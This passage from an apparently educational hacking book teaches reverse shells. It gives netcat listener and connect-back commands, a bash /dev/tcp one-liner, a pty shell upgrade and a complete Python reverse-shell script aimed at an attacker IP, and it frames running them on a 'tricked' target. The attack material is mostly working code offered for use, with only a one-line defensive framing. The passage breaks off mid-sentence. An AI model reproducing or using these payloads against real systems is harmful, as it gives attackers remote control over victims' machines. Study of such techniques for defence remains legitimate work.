    \n# Chapter 5: Reverse Shells\n\n![img](d2d_images/chapter_title_below.png)\n\n\
    Imagine you're trying to control another computer on a network to demonstrate\
    \ how attackers operate, so you can defend yourself better. One of the simplest\
    \ ways hackers gain control over a remote machine is through something called\
    \ a reverse shell.\n\nA reverse shell is like a remote control tunnel. Instead\
    \ of the attacker connecting to the target machine, the target connects back to\
    \ the attacker, reversing the usual direction of the connection. Once connected,\
    \ the attacker gets command-line access to the target system, almost like sitting\
    \ in front of it.\n\n| ![img](d2d_images/chapter_title_corner_decoration_left.png)\
    \  |  | ![img](d2d_images/chapter_title_corner_decoration_right.png)  |\n\n![img](d2d_images/chapter_title_above.png)\n\
    \n# How Reverse Shells Work\n\n![img](d2d_images/chapter_title_below.png)\n\n\
    To demonstrate how a reverse shell works, I will use a tool called Netcat. It’s\
    \ lightweight, powerful, and perfect for setting up reverse shells. Let’s get\
    \ started.\n\nAttacker sets up a listener by typing the following command in the\
    \ terminal:\n\n```\nnc -lvnp 4444\n```\n\nThis starts a listener on port 4444.\
    \ Netcat is now waiting for incoming connections.\n\n- `-l` tells Netcat to listen.\n\
    - `-v` is for verbose output.\n- `-n` avoids DNS resolution (faster).\n- `-p 4444`\
    \ sets the port to listen on.\n\n## Reverse Shell from Target\n\nLet’s say you\
    \ somehow tricked the target into running this:\n\n```\nnc 192.168.31.152 4444\
    \ -e /bin/bash\n```\n\nThis tells Netcat to connect back to the attacker’s IP\
    \ (`192.168.31.152`) on port `4444`, and attach `/bin/bash` (the shell) to the\
    \ connection.\n\nOutput:\n\n```\nListening on 0.0.0.0 4444\nConnection received\
    \ on 192.168.10.158 51432\n```\n\nIf `-e` option is disabled by default for security\
    \ reasons, you can try:\n\n```\nbash -i >& /dev/tcp/<your-ip>/4444 0>&1\n```\n\
    \nOnce connected, you'll have remote control over the target computer.\n\nSometimes,\
    \ the shell might be very basic (missing features like arrow keys or tab completion).\
    \ You can upgrade it like this:\n\n```\npython3 -c 'import pty; pty.spawn(\"/bin/bash\"\
    )'\n```\n\nThis gives you a better, more interactive shell experience.\n\n| ![img](d2d_images/chapter_title_corner_decoration_left.png)\
    \  |  | ![img](d2d_images/chapter_title_corner_decoration_right.png)  |\n\n![img](d2d_images/chapter_title_above.png)\n\
    \n# Creating Reverse Shells with Python\n\n![img](d2d_images/chapter_title_below.png)\n\
    \nIn this lesson, you’ll learn how to create a simple yet powerful Python reverse\
    \ shell. This script allows a remote attacker to gain a shell on a target machine.\n\
    \nThe idea is simple, you run a short Python script on the target machine (the\
    \ victim). This script connects back to the attacker’s machine, which is waiting\
    \ and listening on a port.\n\nOnce connected, the attacker can type commands as\
    \ if they were sitting in front of the target’s terminal.\n\nYou’ve already seen\
    \ what reverse shells are. Now, it's time to build one from scratch using just\
    \ a few lines of code.\n\n## Set Up the Listener\n\nBefore running the Python\
    \ script on the target, you need to be listening for the connection. On your attacker\
    \ machine, use:\n\n```\nnc -lvnp 4444\n```\n\nNext, create the script file with\
    \ `.py` extension, and add the following code:\n\n```python\nimport socket, subprocess,\
    \ os\n\ns = socket.socket()\ns.connect((\"ATTACKER_IP\", 4444))\nos.dup2(s.fileno(),\
    \ 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call([\"/bin/bash\"\
    ])\n```\n\nReplace `ATTACKER_IP` with the IP address of your attacking machine,\
    \ like `192.168.52.131`. Once the script runs on the target machine, it will connect\
    \ back, and you’ll see something like:"
